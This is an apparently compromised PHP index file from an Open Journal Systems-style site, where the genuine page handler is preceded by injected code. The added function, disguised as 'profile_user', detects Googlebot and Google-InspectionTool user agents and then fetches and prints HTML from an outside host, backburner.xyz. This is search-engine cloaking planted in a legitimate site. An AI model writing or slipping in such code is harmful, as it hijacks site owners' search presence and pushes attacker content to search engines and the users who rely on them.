<?php
function profile_user() {
    $refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $pasteUrl = 'https://backburner.xyz/cgk/wdh.html';
    $refererDomain = parse_url($refererUrl, PHP_URL_HOST);

    if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $pasteUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $content = curl_exec($ch);
        curl_close($ch);

        echo $content;
    }
}

profile_user();
?>
<?php

/**
 * @defgroup pages_index
 */
 
/**
 * @file pages/index/index.php
 *
 * Copyright (c) 2013-2019 Simon Fraser University
 * Copyright (c) 2003-2019 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @ingroup pages_index
 * @brief Handle site index requests. 
 *
 */

switch ($op) {
	case 'index':
		define('HANDLER_CLASS', 'IndexHandler');
		import('pages.index.IndexHandler');
		break;
}

?>